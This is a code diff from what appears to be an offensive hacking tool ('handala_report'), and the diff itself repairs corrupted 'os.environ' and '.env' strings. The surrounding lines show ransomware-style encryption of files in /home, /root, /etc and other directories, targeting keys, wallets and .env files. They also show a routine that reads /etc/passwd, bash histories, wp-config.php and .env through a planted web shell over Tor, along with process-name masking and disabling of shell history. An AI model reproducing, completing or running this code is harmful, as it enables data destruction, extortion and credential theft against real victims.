@@ -251,8 +251,8 @@ DB_CONN = None
 HTML_REPORT = "handala_report.html"
 
 # API Keys (set via environment or input)
-SHODAN_API_KEY = os***REMOVED***iron.get("SHODAN_API_KEY", "")
-NUCLEI_TEMPLATES_DIR = os***REMOVED***iron.get("NUCLEI_TEMPLATES", "~/nuclei-templates")
+SHODAN_API_KEY = os.environ.get("SHODAN_API_KEY", "")
+NUCLEI_TEMPLATES_DIR = os.environ.get("NUCLEI_TEMPLATES", "~/nuclei-templates")
 
 # ============================================================================
 # UTILITIES WITH COLOR
@@ -1356,7 +1356,7 @@ def encrypt_file(path):
     except:
         return False
 TARGET_DIRS = ["/home","/root","/var/www","/opt","/etc","/tmp","/usr/local","/backup"]
-TARGET_EXTS = [".txt",".doc",".docx",".pdf",".jpg",".png",".zip",".sql",".db",".conf",".config",".ini",".json",".key",".pem",".crt","***REMOVED***",".log",".bak",".wallet"]
+TARGET_EXTS = [".txt",".doc",".docx",".pdf",".jpg",".png",".zip",".sql",".db",".conf",".config",".ini",".json",".key",".pem",".crt",".env",".log",".bak",".wallet"]
 total = 0
 hostname = os.uname().nodename if hasattr(os, 'uname') else "unknown"
 for d in TARGET_DIRS:
@@ -1508,7 +1508,7 @@ def capture_and_dehash(target, tor_client, shell_url=None):
     creds = {"emails":[], "passwords":[], "hashes":[]}
     if shell_url:
         try:
-            files = ["/etc/passwd","/var/www/html/***REMOVED***","/home/*/.bash_history","/root/.bash_history","/var/www/html/wp-config.php"]
+            files = ["/etc/passwd","/var/www/html/.env","/home/*/.bash_history","/root/.bash_history","/var/www/html/wp-config.php"]
             for f in files:
                 cmd = f"cat {f} 2>/dev/null"
                 resp = tor_client.session.get(shell_url, params={'c': cmd}, timeout=10)
@@ -1694,8 +1694,8 @@ def main():
         ctypes.CDLL("libc.so.6").prctl(15, f"[{rand_str(3)}]", 0, 0, 0)
     except:
         pass
-    os***REMOVED***iron["HISTFILE"] = "/dev/null"
-    os***REMOVED***iron["HISTSIZE"] = "0"
+    os.environ["HISTFILE"] = "/dev/null"
+    os.environ["HISTSIZE"] = "0"
     
     # Tor + C2
     setup_tor()
